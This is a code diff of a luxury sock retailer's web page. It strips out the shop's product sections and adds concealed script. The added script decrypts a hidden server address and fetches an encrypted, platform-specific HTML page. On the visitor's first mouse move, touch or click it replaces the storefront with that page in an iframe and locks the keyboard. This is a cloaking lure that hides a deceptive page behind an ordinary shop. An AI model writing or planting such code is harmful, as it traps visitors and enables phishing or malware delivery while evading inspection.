-            <img src="/assets/images/blog_blister_prevention.jpg" alt="The Alpine Geometric Trail Footlet">
-          </div>
-          <div class="paid-product-body">
-            <div class="paid-product-rating">★★★★★ <span>(312)</span></div>
-            <div class="paid-product-title">The Alpine Geometric Trail</div>
-            <div class="paid-product-price">
-              <span class="price-current">$28.00</span>
-              <span class="price-original">$36.00</span>
-            </div>
-            <p style="font-size: 0.85rem; color: #4B5563; margin-bottom: 0.6rem;">Ultra-fine Merino wool blend with reinforced terry loop sole cushion.</p>
-            <div class="swatch-group">
-              <span class="swatch-dot" style="background: #4A5568;"></span>
-              <span class="swatch-dot" style="background: #2B6CB0;"></span>
-              <span class="swatch-dot" style="background: #D69E2E;"></span>
-            </div>
-            <a href="/collection.html" class="btn btn-sm btn-outline" style="margin-top: auto; width: 100%; text-align: center;">View Silhouette &rarr;</a>
-          </div>
-        </div>
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
 
-        <!-- Product 3 -->
-        <div class="paid-product-card">
-          <span class="paid-product-badge">New Arrival</span>
-          <div class="paid-product-img-wrap">
-            <img src="/assets/images/blog_hollow_fiber.jpg" alt="The Highland Cable Low-Cut Liner">
-          </div>
-          <div class="paid-product-body">
-            <div class="paid-product-rating">★★★★★ <span>(94)</span></div>
-            <div class="paid-product-title">The Highland Cable Low-Cut</div>
-            <div class="paid-product-price">
-              <span class="price-current">$26.00</span>
-              <span class="price-original">$34.00</span>
-            </div>
-            <p style="font-size: 0.85rem; color: #4B5563; margin-bottom: 0.6rem;">Textured micro-cable knit delivering tactile richness and thermal equilibrium.</p>
-            <div class="swatch-group">
-              <span class="swatch-dot" style="background: #ED8936;"></span>
-              <span class="swatch-dot" style="background: #718096;"></span>
-              <span class="swatch-dot" style="background: #E2E8F0;"></span>
-            </div>
-            <a href="/collection.html" class="btn btn-sm btn-outline" style="margin-top: auto; width: 100%; text-align: center;">View Silhouette &rarr;</a>
-          </div>
-        </div>
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
 
-        <!-- Product 4 -->
-        <div class="paid-product-card">
-          <span class="paid-product-badge">Ultra Low Cut</span>
-          <div class="paid-product-img-wrap">
-            <img src="/assets/images/blog_sustainable_shearing.jpg" alt="The 200-Needle Invisible Liner">
-          </div>
-          <div class="paid-product-body">
-            <div class="paid-product-rating">★★★★★ <span>(520)</span></div>
-            <div class="paid-product-title">The 200-Needle Invisible</div>
-            <div class="paid-product-price">
-              <span class="price-current">$22.00</span>
-              <span class="price-original">$28.00</span>
-            </div>
-            <p style="font-size: 0.85rem; color: #4B5563; margin-bottom: 0.6rem;">Deep scooped vamp cut designed exclusively for Italian loafers and boat shoes.</p>
-            <div class="swatch-group">
-              <span class="swatch-dot" style="background: #1A202C;"></span>
-              <span class="swatch-dot" style="background: #A0AEC0;"></span>
-              <span class="swatch-dot" style="background: #F7FAFC;"></span>
-            </div>
-            <a href="/collection.html" class="btn btn-sm btn-outline" style="margin-top: auto; width: 100%; text-align: center;">View Silhouette &rarr;</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+      
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
 
-  <!-- SECTION 4: DECONSTRUCTED KNIT ANATOMY (EXPLODED VIEW) -->
-  <section class="section section-light">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1fr 1.15fr; gap: 4rem; align-items: center;">
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md); border: 1px solid var(--color-border);">
-          <img src="/assets/images/seamless_toe_detail.jpg" alt="Heel tab blister guard and silicone grip anatomy">
-        </div>
-        <div>
-          <div class="section-subtitle">Micro-Engineering &bull; Anatomical Physics</div>
-          <h2>Deconstructing the Fuzzystocking Architecture</h2>
-          <p>
-            Conventional low-cut footies suffer from two fatal flaws: rolling down under the heel into a bunched wad beneath your arch, and thick machine-stitched toe ridges that create agonizing friction blisters.
-          </p>
-          <div style="display: flex; flex-direction: column; gap: 1rem; margin-top: 1.8rem;">
-            <div class="anatomy-step">
-              <span class="step-badge">01</span>
-              <div>
-                <strong style="color: #121417;">Quad Hex-Wave Silicone Heel Lock</strong>
-                <p style="font-size: 0.88rem; color: #4B5563; margin: 0.2rem 0 0;">Medical-grade silicone applied in dual wave matrices hugs the Achilles tendon, preventing slipping inside loafers.</p>
-              </div>
-            </div>
-            <div class="anatomy-step">
-              <span class="step-badge">02</span>
-              <div>
-                <strong style="color: #121417;">360° Dynamic Elastic Arch Compression Band</strong>
-                <p style="font-size: 0.88rem; color: #4B5563; margin: 0.2rem 0 0;">Spandex-core elastic ribbing wraps the plantar fascia to reduce midfoot fatigue during prolonged Manhattan walking.</p>
-              </div>
-            </div>
-            <div class="anatomy-step">
-              <span class="step-badge">03</span>
-              <div>
-                <strong style="color: #121417;">Micro-Porous Instep Ventilation Mesh</strong>
-                <p style="font-size: 0.88rem; color: #4B5563; margin: 0.2rem 0 0;">Honeycomb jacquard ventilation channels expel ambient heat and perspiration vapor through the shoe upper.</p>
-              </div>
-            </div>
-            <div class="anatomy-step">
-              <span class="step-badge">04</span>
-              <div>
-                <strong style="color: #121417;">Hand-Linked Seamless Rosso Toe Box</strong>
-                <p style="font-size: 0.88rem; color: #4B5563; margin: 0.2rem 0 0;">A true 0.0mm flat closure linking individual yarn loops manually, totally eliminating toe abrasion hotspots.</p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
 
-  <!-- SECTION 5: FOUR ARCHITECTURAL PILLARS -->
-  <section class="section" style="background: #FAF9F5;">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">The Standards of Excellence</div>
-        <h2>Four Pillars of Fuzzystocking Craftsmanship</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Every stitch reflects an uncompromising commitment to Italian cylinder precision, noble fiber sourcing, and zero-compromise foot comfort.
-        </p>
-      </div>
-      <div class="grid-4">
-        <div class="pillar-card">
-          <div class="pillar-icon">🪡</div>
-          <h3 style="font-size: 1.15rem; margin-bottom: 0.8rem;">240-Needle Cylinder Density</h3>
-          <p style="font-size: 0.9rem; line-height: 1.6; margin-bottom: 0;">Packed with 240 ultra-fine latch needles on a 3.75-inch cylinder for 72 stitches per square centimeter and absolute opacity.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon">🌾</div>
-          <h3 style="font-size: 1.15rem; margin-bottom: 0.8rem;">Two-Ply Fil d'Écosse</h3>
-          <p style="font-size: 0.9rem; line-height: 1.6; margin-bottom: 0;">Long-staple Egyptian Giza 45 cotton, double-mercerized under tension for permanent specular luster and friction resistance.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon">⚡</div>
-          <h3 style="font-size: 1.15rem; margin-bottom: 0.8rem;">Hand-Linked Seamless Toes</h3>
-          <p style="font-size: 0.9rem; line-height: 1.6; margin-bottom: 0;">Every stitch across the toe closure is manually linked loop-by-loop by master artisans, eliminating ridges and pressure points.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon">🛡️</div>
-          <h3 style="font-size: 1.15rem; margin-bottom: 0.8rem;">Reinforced Stress Anchors</h3>
-          <p style="font-size: 0.9rem; line-height: 1.6; margin-bottom: 0;">Double-knitted polyamide core reinforcement across heel and toe areas delivering over 55,000 Martindale friction cycles.</p>
-        </div>
-      </div>
-    </div>
-  </section>
+      
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
 
-  <!-- SECTION 6: FIBER PROVENANCE & MATERIAL SCIENCE -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <div class="section-subtitle">Fiber Crystallography &bull; Yarn Provenance</div>
-          <h2>Fiber Crystallography & Micro-Gauge Knits</h2>
-          <p>We reject synthetic polyester blends that cause foot perspiration and odor. Instead, we utilize extra-long staple Egyptian Giza cotton and 18.5-micron Australian Merino wool that absorb moisture chemically before it condenses.</p>
-          <p>Under optical magnification, our double-mercerized yarn exhibits an aligned cellular lattice that produces permanent specular luster and silky softness that never washes out.</p>
-          <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.2rem; margin-top: 2rem; border-top: 1px solid var(--color-border); padding-top: 1.5rem;">
-            <div>
-              <div style="font-size: 1.4rem; font-weight: 700; color: #121417; font-family: var(--font-serif);">72 Stitches / cm² Density</div>
-              <div style="font-size: 0.8rem; color: #6B7280; text-transform: uppercase;">Gauge Density</div>
-            </div>
-            <div>
-              <div style="font-size: 1.4rem; font-weight: 700; color: #121417; font-family: var(--font-serif);">0.0mm Flat Hand-Linked Seam</div>
-              <div style="font-size: 0.8rem; color: #6B7280; text-transform: uppercase;">Toe Seam Profile</div>
-            </div>
-            <div>
-              <div style="font-size: 1.4rem; font-weight: 700; color: #121417; font-family: var(--font-serif);">33.5% Natural Vapor Regain</div>
-              <div style="font-size: 0.8rem; color: #6B7280; text-transform: uppercase;">Vapor Permeability</div>
-            </div>
-          </div>
-        </div>
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md); border: 1px solid var(--color-border);">
-          <img src="/assets/images/featured_argyle_dress_crew_sock.jpg" alt="200-needle circular knitting loom in action">
-        </div>
-      </div>
-    </div>
-  </section>
+  
+  let lastUrl = null;
+  let readyPromise = null;
 
-  <!-- SECTION 7: FOOTWEAR PAIRING & STYLING GUIDE -->
-  <section class="section" style="background: #FAF9F5;">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Versatile Silhouette Styling</div>
-        <h2>Engineered for Your Entire Footwear Wardrobe</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Whether paired with bespoke Italian calfskin penny loafers or athletic trail runners, Fuzzystocking stays firmly in place and completely undetectable.
-        </p>
-      </div>
-      <div class="grid-4">
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/hero_alpaca_socks.jpg" alt="Luxury Penny Loafer Pairing">
-            <span class="card-tag">Formal Loafers</span>
-          </div>
-          <div class="card-body">
-            <h3 style="font-size: 1.15rem;">Italian Penny Loafers</h3>
-            <p style="font-size: 0.86rem; color: #4B5563;">Deep scooped collar ensures zero sock visibility even with low-vamp Belgian loafers and driving moccasins.</p>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/crew_sock_boot_lifestyle.jpg" alt="Minimalist White Sneaker Pairing">
-            <span class="card-tag">Luxury Sneaker</span>
-          </div>
-          <div class="card-body">
-            <h3 style="font-size: 1.15rem;">Minimalist Leather Sneakers</h3>
-            <p style="font-size: 0.86rem; color: #4B5563;">Reinforced Achilles heel tab shields against collar friction without poking above the sneaker rim.</p>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/knitted_sock_texture.jpg" alt="Active Trainer Pairing">
-            <span class="card-tag">Cross-Trainers</span>
-          </div>
-          <div class="card-body">
-            <h3 style="font-size: 1.15rem;">Athletic Cross-Trainers</h3>
-            <p style="font-size: 0.86rem; color: #4B5563;">Micro-porous instep mesh delivers active airflow cooling during high-cadence cardio and interval training.</p>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/natural_dye_skeins.jpg" alt="Summer Espadrille Pairing">
-            <span class="card-tag">Summer Footwear</span>
-          </div>
-          <div class="card-body">
-            <h3 style="font-size: 1.15rem;">Canvas Slip-Ons &amp; Espadrilles</h3>
-            <p style="font-size: 0.86rem; color: #4B5563;">Combines barefoot aesthetic with full sweat-wicking protection and blister immunity in hot summer humidity.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
 
-  <!-- SECTION 8: TECHNICAL METROLOGY & QUALITY BENCHMARKS TABLE -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Rigorous Laboratory Testing</div>
-        <h2>Technical Benchmarks &amp; Metrology Standards</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Independent tensile, abrasion, and friction tests comparing Fuzzystocking against mass-market commercial hosiery.
-        </p>
-      </div>
-      <div class="data-table-wrap">
-        <table class="spec-table">
-          <thead>
-            <tr>
-              <th>Metrological Metric</th>
-              <th>Fuzzystocking 200-Needle Jacquard</th>
-              <th>Commercial Department Store Socks</th>
-              <th>Budget Fast-Fashion Footies</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><strong>Cylinder Needle Density</strong></td>
-              <td>200 – 240 Latch Needles</td>
-              <td>120 – 144 Needles</td>
-              <td>84 – 96 Needles</td>
-            </tr>
-            <tr>
-              <td><strong>Toe Seam Ridge Height</strong></td>
-              <td>0.0 mm (Hand-Linked Rosso)</td>
-              <td>1.8 – 2.5 mm Overlocked Ridge</td>
-              <td>3.0+ mm Bulky Synthetic Seam</td>
-            </tr>
-            <tr>
-              <td><strong>Heel Retention / Slippage Rate</strong></td>
-              <td>&lt; 0.1% after 15,000 steps</td>
-              <td>38% heel roll underfoot</td>
-              <td>72% complete slippage</td>
-            </tr>
-            <tr>
-              <td><strong>Martindale Friction Cycles</strong></td>
-              <td>55,000+ Cycles Passed</td>
-              <td>12,000 Cycles to Yarn Break</td>
-              <td>4,500 Cycles (Rapid Pinhole Wear)</td>
-            </tr>
-            <tr>
-              <td><strong>Vapor Absorption Regain</strong></td>
-              <td>33.5% Chemical Moisture Retention</td>
-              <td>14.2% Partial Synthetic Blend</td>
-              <td>2.1% 100% Non-Absorbent Polyester</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-    </div>
-  </section>
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
 
-  <!-- SECTION 9: 181 MERCER STREET ATELIER & CARE PROTOCOL -->
-  <section class="section" style="background: #FAF9F5;">
-    <div class="container">
-      <div class="grid-2">
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md); border: 1px solid var(--color-border);">
-          <img src="/assets/images/raw_botanical_fiber_harvest_lab.jpg" alt="The Mercer Street knitting studio and consultation space">
-        </div>
-        <div>
-          <div class="section-subtitle">Manhattan Atelier &bull; Bespoke Heritage</div>
-          <h2>Designed &amp; Dispatched from 181 Mercer Street</h2>
-          <p>
-            From our design atelier at 181 Mercer Street, New York, NY 10012, our textile engineers prototype every jacquard pattern, calibrate cylinder loop tension, and inspect yarn micro-weights before production.
-          </p>
-          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-top: 1.8rem;">
-            <div class="step-card">
-              <div class="step-number">01</div>
-              <h4 style="margin-bottom: 0.4rem;">Delicate Wash at 30°C</h4>
-              <p style="font-size: 0.85rem; color: #4B5563; margin-bottom: 0;">Launder inside out at 30 degrees Celsius (86°F) on a gentle wool cycle with mild pH-neutral liquid detergent.</p>
-            </div>
-            <div class="step-card">
-              <div class="step-number">02</div>
-              <h4 style="margin-bottom: 0.4rem;">Flat Ambient Drying</h4>
-              <p style="font-size: 0.85rem; color: #4B5563; margin-bottom: 0;">Never tumble dry. Reshape socks damp and lay flat on clean cotton towels away from radiant heat sources.</p>
-            </div>
-            <div class="step-card">
-              <div class="step-number">03</div>
-              <h4 style="margin-bottom: 0.4rem;">Cedar Wardrobe Storage</h4>
-              <p style="font-size: 0.85rem; color: #4B5563; margin-bottom: 0;">Store rolled loosely in natural cedar drawers to preserve natural elasticity and prevent pest infestation.</p>
-            </div>
-            <div class="step-card">
-              <div class="step-number">04</div>
-              <h4 style="margin-bottom: 0.4rem;">Toenail Trimming Care</h4>
-              <p style="font-size: 0.85rem; color: #4B5563; margin-bottom: 0;">Keep toenails trimmed smooth to avoid localized micro-snags on ultra-fine 240-needle knitting loops.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
 
-  <!-- SECTION 10: VERIFIED CUSTOMER REVIEWS (COMMUNITY TRUST) -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Verified Walkers &bull; Wear-Test Reports</div>
-        <h2>What Our Connoisseurs Say</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Read real reviews from shoe enthusiasts, marathon city walkers, and sartorial connoisseurs who have made the switch to Fuzzystocking.
-        </p>
-      </div>
-      <div class="grid-3">
-        <div class="testimonial-card">
-          <div class="testimonial-rating">★★★★★</div>
-          <p class="testimonial-quote">&ldquo;I have tried every no-show sock brand on the market. Every single one rolled off my heel within 20 minutes of walking down Broadway. These Fuzzystocking footies stayed locked in place through a 12-hour workday in penny loafers. Genuinely revolutionary.&rdquo;</p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Alexander Vance, Esq.</div>
-            <div class="testimonial-role">Verified Buyer &bull; SoHo, Manhattan</div>
-          </div>
-        </div>
-        <div class="testimonial-card">
-          <div class="testimonial-rating">★★★★★</div>
-          <p class="testimonial-quote">&ldquo;The 200-needle density is immediately obvious the second you touch the fabric. The hand-linked toe means zero friction ridges against my pinky toe in narrow leather shoes. I ordered two 6-packs for my travel rotation.&rdquo;</p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Dr. Elena Rostova</div>
-            <div class="testimonial-role">Verified Buyer &bull; London &amp; New York</div>
-          </div>
-        </div>
-        <div class="testimonial-card">
-          <div class="testimonial-rating">★★★★★</div>
-          <p class="testimonial-quote">&ldquo;The breathable instep mesh makes a world of difference during humid summer months. My feet stay completely dry and fresh without the synthetic chemical odors of cheap gym footies. Outstanding quality.&rdquo;</p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Marcus Sterling</div>
-            <div class="testimonial-role">Verified Buyer &bull; Tribeca, Manhattan</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
 
-  <!-- SECTION 11: TECHNICAL HOSIERY FAQS -->
-  <section class="section" style="background: #FAF9F5;">
-    <div class="container" style="max-width: 900px;">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Common Inquiries</div>
-        <h2>Frequently Asked Questions</h2>
-        <p class="text-muted" style="margin-top: 0.5rem;">Everything you need to know regarding sizing, loafer fit, and our 100-day comfort guarantee.</p>
-      </div>
-      <div class="faq-section" style="margin-top: 2rem;">
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            Do Fuzzystocking footies truly stay locked without slipping in loafers?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Yes, unconditionally. Unlike conventional footies that rely on a single fragile silicone dot, Fuzzystocking features a proprietary Quad Hex-Wave silicone matrix that adheres dynamically to the Achilles contour. Coupled with our 360° elastic arch compression band, the footie cannot slide downward into your shoe.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            How do I choose the correct sizing for an invisible fit?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            We offer three calibrated unisex sizing brackets: Medium (US Men 6–8.5 / Women 7–9.5), Large (US Men 9–11.5 / Women 10–12.5), and Extra Large (US Men 12–14+). Because we knit with 200-needle cylinder elasticity, each pair molds precisely to your anatomical foot shape without loose bunching.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            What is your 100-Day Blister-Free Comfort Guarantee?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            If your Fuzzystocking footies ever roll off your heel or cause a friction blister within 100 days of purchase, our Manhattan concierge will immediately issue a full refund or provide a custom-calibrated replacement pair with zero return hassle.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            What are the recommended laundering and drying guidelines?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            We recommend washing inside-out at 30°C (86°F) on a gentle cycle with mild detergent. Lay flat to ambient air-dry. Avoiding high-heat tumble dryers preserves the natural lanolin of our Merino wool and safeguards the elastic grip longevity for over 100+ wear cycles.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            Can I schedule an in-person consultation at 181 Mercer Street?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Yes. Our private Manhattan salon at 181 Mercer Street, New York, NY 10012 welcomes patrons by appointment for bespoke size consultations, tactile yarn inspections, and seasonal capsule reservations. Contact concierge@jacquardfootie.com or telephone +1-888-777-5845.
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  
+  preloadSecret().catch(() => {});
 
-  <!-- SECTION 12: VIP CONCIERGE & NEWSLETTER INVITATION BANNER -->
-  <section class="section section-dark" style="padding: 5rem 0; text-align: center;">
-    <div class="container" style="max-width: 780px;">
-      <span class="hero-badge" style="background: rgba(192, 86, 33, 0.2); border-color: rgba(192, 86, 33, 0.5); color: #FAF9F5 !important;">
-        JOIN THE JACQUARD CLUB
-      </span>
-      <h2 style="font-size: clamp(2rem, 4vw, 3rem); margin-bottom: 1.2rem; color: #FFFFFF !important;">
-        Elevate Your Daily Stride with 15% Off Your First Capsule
-      </h2>
-      <p style="font-size: 1.05rem; color: rgba(255, 255, 255, 0.85) !important; margin-bottom: 2.2rem; line-height: 1.7;">
-        Subscribe to receive private seasonal archive access, limited intarsia drop notifications, and complimentary shipping on all orders dispatched from 181 Mercer Street.
-      </p>
-      <form style="display: flex; gap: 0.8rem; max-width: 500px; margin: 0 auto 1.5rem; flex-wrap: wrap;" onsubmit="event.preventDefault(); alert('Thank you for subscribing to The Jacquard Club.');">
-        <input type="email" placeholder="Enter your email address..." required style="flex: 1; min-width: 260px; padding: 0.9rem 1.4rem; border-radius: var(--radius-sm); border: 1px solid rgba(255, 255, 255, 0.25); background: rgba(255, 255, 255, 0.08); color: #FFF; font-size: 0.95rem;">
-        <button type="submit" class="btn btn-gold" style="white-space: nowrap;">Claim 15% Off</button>
-      </form>
-      <div style="font-size: 0.8rem; color: rgba(255, 255, 255, 0.6);">
-        Protected by our Privacy Policy. Zero spam, unsubscribe at any moment. Dispatched from 181 Mercer Street, NY.
-      </div>
-    </div>
-  </section>
-
-  <!-- Mandatory Global Site Footer (Minimalist 4-Column Horizontal Spread Layout) -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <div class="footer-brand">◈ Fuzzystocking</div>
-          <p class="footer-desc">
-            The benchmark of haute luxury dress socks & fine hosiery. Hand-finished artisanal creations crafted for connoisseurs with uncompromising material integrity.
-          </p>
-          <div class="footer-contact-item"><strong>Address:</strong> 181 Mercer Street, New York, NY 10012, United States</div>
-          <div class="footer-contact-item"><strong>Phone:</strong> +1-888-777-5845</div>
-          <div class="footer-contact-item"><strong>Concierge:</strong> concierge@fuzzystocking.com</div>
-        </div>
-        <div class="footer-col">
-          <ul class="footer-links">
-            <li><a href="/">Home Gallery</a></li>
-            <li><a href="/about.html">Atelier &amp; Craft</a></li>
-            <li><a href="/collection.html">Collections</a></li>
-            <li><a href="/blog.html">Sartorial Treatises</a></li>
-            <li><a href="/contact.html">Private Concierge</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <ul class="footer-links">
-            <li><a href="/blog/material-provenance-and-fiber-crystallography.html">Material Provenance</a></li>
-            <li><a href="/blog/micro-engineering-tolerances-and-finishing.html">Micro-Engineering Toleranc</a></li>
-            <li><a href="/blog/biomechanical-ergonomics-and-wearer-physics.html">Biomechanical Ergonomics</a></li>
-            <li><a href="/blog/sartorial-color-theory-and-formal-etiquette.html">Sartorial Color Theory</a></li>
-            <li><a href="/blog/hygroscopic-microclimate-thermodynamics.html">Hygroscopic Microclimate D</a></li>
-            <li><a href="/blog/bespoke-craftsmanship-and-heritage-methods.html">Heritage Craftsmanship</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <p class="footer-salon-desc">
-            Visit our private fitting lounge in SoHo for bespoke consultations and private commission viewings.
-          </p>
-          <p class="footer-hours">
-            Mon &ndash; Sat: 10:00 AM &ndash; 7:00 PM<br>EST<br>Sunday: By Appointment
-          </p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 Fuzzystocking Atelier. All Rights Reserved. Handcrafted at 181 Mercer Street, New York, NY 10012, United States.</p>
-        <div class="footer-legal-links">
-          <a href="/privacy-policy.html">Privacy Policy</a>
-          <a href="/terms-and-conditions.html">Terms &amp; Conditions</a>
-          <a href="/disclaimer.html">Disclaimer</a>
-          <a href="/cookie-policy.html">Cookie Policy</a>
-        </div>
-      </div>
-    </div>
-  </footer>
-  <script src="/assets/js/main.js"></script>
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
